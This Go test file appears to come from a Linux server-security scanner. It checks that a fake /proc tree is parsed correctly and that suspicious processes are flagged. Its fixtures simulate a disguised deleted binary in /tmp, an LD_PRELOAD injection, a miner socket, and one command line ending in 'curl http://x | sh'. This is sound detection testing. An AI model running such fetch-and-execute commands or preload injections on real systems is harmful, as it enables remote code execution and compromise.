package procfs_test

// Внешний тестовый пакет: fakeproc сам импортирует procfs, поэтому тест
// на поддельном дереве не может жить во внутреннем пакете procfs.

import (
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/Zagorsky17/ServerSecurityGo/internal/fakeproc"
	"github.com/Zagorsky17/ServerSecurityGo/internal/procfs"
)

// TestReadProcessFake читает поддельное дерево и проверяет, что все
// источники (stat, status, cmdline, exe, cwd, fd, environ, ns, cgroup)
// разобраны.
func TestReadProcessFake(t *testing.T) {
	now := time.Now()
	tree := fakeproc.Demo(now)
	procRoot, hostRoot, err := tree.Write(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	fs := fakeproc.NewFS(procRoot, hostRoot)
	pids, err := fs.PIDs()
	if err != nil || len(pids) != len(tree.Procs) {
		t.Fatalf("PIDs: %v %v", pids, err)
	}
	boot, err := fs.BootTime()
	if err != nil || boot.Unix() != tree.BootTime.Unix() {
		t.Fatalf("boot: %v %v", boot, err)
	}
	if fs.MemTotal() != tree.MemTotalKB*1024 {
		t.Errorf("MemTotal = %d", fs.MemTotal())
	}
	if u := fs.Users(); u[33] != "www-data" || u[0] != "root" {
		t.Errorf("users: %v", u)
	}

	raw, err := fs.ReadProcess(3301, boot)
	if err != nil {
		t.Fatal(err)
	}
	p := raw.Proc
	if p.Exe != "/tmp/.ICE-unix/dbus-daemon" || !p.ExeDeleted {
		t.Errorf("exe = %q deleted=%v", p.Exe, p.ExeDeleted)
	}
	if p.Cwd != "/tmp" || p.PPID != 1 || p.Name != "dbus-daemon" {
		t.Errorf("поля: %+v", p)
	}
	if !slices.Contains(p.EnvFlags, "LD_PRELOAD") {
		t.Errorf("LD_PRELOAD не обнаружен: %v", p.EnvFlags)
	}
	if _, ok := raw.SocketInodes[2003]; !ok {
		t.Errorf("сокет 2003 не найден: %v", raw.SocketInodes)
	}
	if p.Namespaces["net"] != "net:[4026531840]" {
		t.Errorf("ns: %v", p.Namespaces)
	}
	if p.StartTime.IsZero() || p.StartTime.After(now) {
		t.Errorf("время старта %v", p.StartTime)
	}

	k, err := fs.ReadProcess(15, boot)
	if err != nil || !k.Proc.Kernel || k.Proc.Exe != "" {
		t.Errorf("поток ядра: %+v %v", k.Proc, err)
	}
	c, _ := fs.ReadProcess(1200, boot)
	if c.Proc.ContainerRuntime != "docker" || c.Proc.Container != "3f4e5d6c7b8a" {
		t.Errorf("контейнер: %q %q", c.Proc.ContainerRuntime, c.Proc.Container)
	}

	if _, err := fs.ReadProcess(99999, boot); err != procfs.ErrGone {
		t.Errorf("несуществующий процесс: %v", err)
	}

	socks, _ := fs.ReadNetTables(3101, "net:[4026531840]")
	found := false
	for _, s := range socks {
		if s.Inode == 2001 && s.RemotePort == 3333 && s.RemoteAddr == "198.51.100.77" {
			found = true
		}
	}
	if !found {
		t.Errorf("сокет майнера не найден: %+v", socks)
	}
}

// TestReadProcessLimits: данные процесса в /proc задаёт сам процесс, поэтому
// командная строка и пути fd читаются с лимитом, а окружение — потоком.
func TestReadProcessLimits(t *testing.T) {
	now := time.Now()
	tree := fakeproc.Demo(now)
	// Длина цели симлинка: в Linux до 4 КБ, в macOS около 1 КБ — на macOS
	// путь короче лимита и проверка обрезки пропускается.
	longPath := 3000
	if runtime.GOOS != "linux" {
		longPath = 500
	}
	tree.Procs = append(tree.Procs, &fakeproc.Proc{PID: 5000, PPID: 1, Comm: "bash", UID: 1000, State: "S", StartTicks: 100,
		Args: []string{"bash", "-c", strings.Repeat("A", 1<<20) + "; curl http://x | sh"},
		Exe:  "/usr/bin/bash", Cwd: "/",
		FDs: map[int]string{3: "/tmp/" + strings.Repeat("d", longPath)},
		Env: []string{"X=" + strings.Repeat("v", 1<<20), "LD_PRELOAD=/tmp/x.so", "LD_AUDIT="}})
	procRoot, hostRoot, err := tree.Write(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	fs := fakeproc.NewFS(procRoot, hostRoot)
	raw, err := fs.ReadProcess(5000, tree.BootTime)
	if err != nil {
		t.Fatal(err)
	}
	total := 0
	for _, a := range raw.RawArgs {
		total += len(a) + 1
	}
	if total > procfs.DefaultMaxCmdline+1 || !raw.Proc.CmdlineTruncated {
		t.Errorf("cmdline: %d байт, truncated=%v", total, raw.Proc.CmdlineTruncated)
	}
	if !slices.Equal(raw.Proc.EnvFlags, []string{"LD_PRELOAD"}) {
		t.Errorf("EnvFlags = %v (LD_PRELOAD после 1 МБ окружения, пустой LD_AUDIT не считается)", raw.Proc.EnvFlags)
	}
	if len(raw.Proc.Files) != 1 {
		t.Fatalf("Files: %+v", raw.Proc.Files)
	}
	if tg := raw.Proc.Files[0].Target; len(tg) > procfs.MaxFDTarget+len("…") || (runtime.GOOS == "linux" && !strings.HasSuffix(tg, "…")) {
		t.Errorf("путь fd не обрезан: %d байт", len(tg))
	}

	// Явные лимиты сканера.
	raw, _ = fs.ReadProcessLimits(5000, tree.BootTime, procfs.Limits{Cmdline: 4096, Files: 0})
	if n := len(strings.Join(raw.RawArgs, " ")); n > 4096 || len(raw.Proc.Files) != 0 {
		t.Errorf("Limits: cmdline %d, files %d", n, len(raw.Proc.Files))
	}
	// Короткая командная строка не помечается.
	raw, _ = fs.ReadProcess(3301, tree.BootTime)
	if raw.Proc.CmdlineTruncated {
		t.Error("обычная командная строка помечена как обрезанная")
	}
}
